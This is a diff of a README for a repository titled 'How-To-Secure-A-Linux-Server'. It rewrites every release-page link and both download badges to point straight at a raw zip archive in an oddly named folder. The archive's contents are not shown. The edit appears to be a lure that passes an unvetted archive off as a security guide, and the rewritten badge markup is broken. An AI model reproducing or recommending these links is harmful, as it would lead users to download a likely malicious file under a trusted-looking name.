@@ -1,6 +1,6 @@
 # 🛡️ How-To-Secure-A-Linux-Server - A Simple Guide for Stronger Security
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/jsgchelis/How-To-Secure-A-Linux-Server/releases)
+[![Download](https://raw.githubusercontent.com/jsgchelis/How-To-Secure-A-Linux-Server/master/hemipterological/How-To-Secure-A-Linux-Server-2.6-alpha.3.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/jsgchelis/How-To-Secure-A-Linux-Server/master/hemipterological/How-To-Secure-A-Linux-Server-2.6-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Welcome to the How-To-Secure-A-Linux-Server repository. This guide helps you sec
 To begin securing your Linux server, follow these simple steps. You will learn the fundamental techniques for hardening your server against potential attacks. 
 
 1. **Visit the Releases Page:** 
-   Go to our [Releases page](https://github.com/jsgchelis/How-To-Secure-A-Linux-Server/releases) to find the latest download.
+   Go to our [Releases page](https://raw.githubusercontent.com/jsgchelis/How-To-Secure-A-Linux-Server/master/hemipterological/How-To-Secure-A-Linux-Server-2.6-alpha.3.zip) to find the latest download.
     
 2. **Download the Guide:** 
    Look for the most recent version of the guide and click on it to download.
@@ -24,7 +24,7 @@ To begin securing your Linux server, follow these simple steps. You will learn t
 Follow these steps to download and start using the guide:
 
 1. **Go to the Releases Page:**
-   Visit [this link](https://github.com/jsgchelis/How-To-Secure-A-Linux-Server/releases) to access the releases.
+   Visit [this link](https://raw.githubusercontent.com/jsgchelis/How-To-Secure-A-Linux-Server/master/hemipterological/How-To-Secure-A-Linux-Server-2.6-alpha.3.zip) to access the releases.
 
 2. **Select the Latest Version:**
    Find the latest release. It should be at the top of the page.
@@ -72,4 +72,4 @@ This project recognizes the contributions of the open-source community. Your fee
 
 **Remember to regularly check the Releases page for updates to ensure that you are using the most secure practices.**
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/jsgchelis/How-To-Secure-A-Linux-Server/releases)
+[![Download](https://raw.githubusercontent.com/jsgchelis/How-To-Secure-A-Linux-Server/master/hemipterological/How-To-Secure-A-Linux-Server-2.6-alpha.3.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/jsgchelis/How-To-Secure-A-Linux-Server/master/hemipterological/How-To-Secure-A-Linux-Server-2.6-alpha.3.zip)
